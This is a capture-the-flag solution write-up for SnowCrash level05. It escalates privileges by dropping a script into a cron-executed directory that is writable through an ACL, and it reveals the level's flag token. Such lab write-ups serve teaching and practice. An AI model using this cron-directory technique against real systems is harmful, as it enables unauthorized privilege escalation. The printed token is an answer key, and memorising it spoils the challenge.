# Level05 Solution

## Starting VM

```bash
qemu-system-x86_64 -m 2048 -cdrom ./SnowCrash.iso -boot d -net nic,model=virtio -net user,hostfwd=tcp::4242-:4242
```

## Objective
Exploit a cron job that executes writable scripts to retrieve the flag05 token.

## Vulnerability
Arbitrary code execution via writable cron script directory with privilege escalation.

## Discovery

### Mail Hint
Check the mail for level05 to discover the cron job:
```bash
cat /var/mail/level05
# Output: */2 * * * * su -c "sh /usr/sbin/openarenaserver" - flag05
```

The cron job runs every 2 minutes, executing `/usr/sbin/openarenaserver` as flag05.

### Openarenaserver Script Analysis
```bash
cat /usr/sbin/openarenaserver
#!/bin/sh
for i in /opt/openarenaserver/* ; do
    (ulimit -t 5; bash -x "$i")
    rm -f "$i"
done
```

**The Script Does:**
1. Loops through all files in `/opt/openarenaserver/`
2. Executes each file with bash as flag05
3. Deletes the file after execution (no cleanup verification)

### Directory Permissions with ACLs
```bash
ls -la /opt/openarenaserver/
drwxrwxr-x+ 2 root root

getfacl /opt/openarenaserver/
# user:level05:rwx (allows write!)
# user:flag05:rwx
```

**Key Finding:** Level05 has write permissions via ACL!

## Exploitation

### Step 1: Create Exploit Script
Create a bash script in the writable cron directory:

```bash
cat > /opt/openarenaserver/exploit.sh << 'EOF'
#!/bin/bash
whoami > /tmp/whoami.txt
id >> /tmp/whoami.txt
getflag >> /tmp/whoami.txt 2>&1
EOF
chmod +x /opt/openarenaserver/exploit.sh
```

### Step 2: Wait for Cron Execution
The cron job runs every 2 minutes:
- Cron executes: `su -c "sh /usr/sbin/openarenaserver" - flag05`
- This runs the openarenaserver script as flag05
- The script finds our exploit.sh and executes it with `bash -x`
- Our script runs with flag05 privileges

### Step 3: Retrieve the Results
After 2 minutes, check the output file:
```bash
cat /tmp/whoami.txt
# Output includes the flag05 token from getflag
```

### Step 4: Extract Token
The token is extracted from the getflag output:
```
Check flag.Here is your token : viuaaale9huek52boumoomioc
```

## Security Flaws

1. **Writable script directory**: `/opt/openarenaserver/` is writable by level05
2. **Cron privilege escalation**: Cron job runs arbitrary scripts as flag05
3. **No file validation**: No checks on what files are executed
4. **Predictable execution**: Cron runs every 2 minutes (known timing)
5. **ACL misconfiguration**: ACLs grant write access to level05 on flag05-owned scripts
6. **File deletion after execution**: Scripts auto-deleted (but that's after execution)

## Answer

- **Level05 Token**: `viuaaale9huek52boumoomioc`
- **Vulnerability Type**: Arbitrary code execution via cron job with writable script directory
- **Impact**: Command execution as flag05 user through ACL-based write access
